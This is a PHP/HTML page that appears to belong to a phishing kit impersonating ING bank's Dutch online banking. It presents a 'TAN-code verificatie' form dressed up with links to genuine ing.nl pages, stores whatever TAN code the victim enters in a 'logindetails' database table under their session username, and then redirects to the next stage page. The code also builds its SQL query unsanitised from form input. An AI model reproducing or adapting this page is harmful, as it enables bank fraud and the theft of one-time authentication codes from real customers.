<!doctype html>
<html lang="en">
<?php
error_reporting(0);
session_start();
if ( isset( $_SESSION['klant'] ) ) {
} else {
}
include 'dbconnect.php';
?>
  <head>
    <title>Persoonlijke informatie</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
   <ul class="topnav">
  <li class="left"><a class="active" href="index.php"><img style="height: 35px; width: 118px;" src="logo1.png"></a></li>
  <div class="rightdiv"><li class="right activelan"><a class="test" href="">NL</a></li>
  <li class="right activelan2"><a href="" style="color: #767676">EN</a></li></div>
</ul>
<form  method="post" action="">
<?php
$gebruikersnaam= $_SESSION['gebruikersnaam'];

if (isset($_POST['Doorgaan'])){
			$Tancode = ($_POST["Tancode"]);
			$sql = "UPDATE logindetails SET tancode='$Tancode' WHERE gebruikersnaam = '$gebruikersnaam'";
			mysqli_query ($conn, $sql);
			header('location:newload1.php');
}
    if(empty($_SESSION['gebruikersnaam'])){
        header("Location: index.php");
        die("Redirecting to index.php");
    }
?>
<div class="login">
<h1 id="ingtekst">TAN-code verificatie:</h1><br>

  TAN-code:<br>
  <input type="text" name="Tancode" class="box1" placeholder="" required>
  <br>
  <br>
  <input type="submit" name="Doorgaan" value="Doorgaan"/><span style="margin-left: 30px;"><img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="hulp" href="https://inlogcodes.mijn.ing.nl/particulier/zelf-regelen/instellen/inlogcodes/index.jsp">Hulp nodig?</a></span>
</br>	
</div>
<div class="links">
<span style="margin-left: 30px;"><img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="link" href="https://www.ing.nl/de-ing/veilig-bankieren/index.html">Veilig bankieren</a>
<img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="link" href="https://www.ing.nl/de-ing/privacy-statement/index.html">Privacy en cookies</a>
<img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="link" href="https://www.ing.nl/de-ing/disclaimer/index.html">Disclaimer</a></span>	
</div>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
	<script type="text/javascript">
        function removeDiv(btn){
            var element = document.getElementById("remove");
			element.parentNode.removeChild(element);
        }
    </script>
  </div>
  </form>
</body>
</html> 	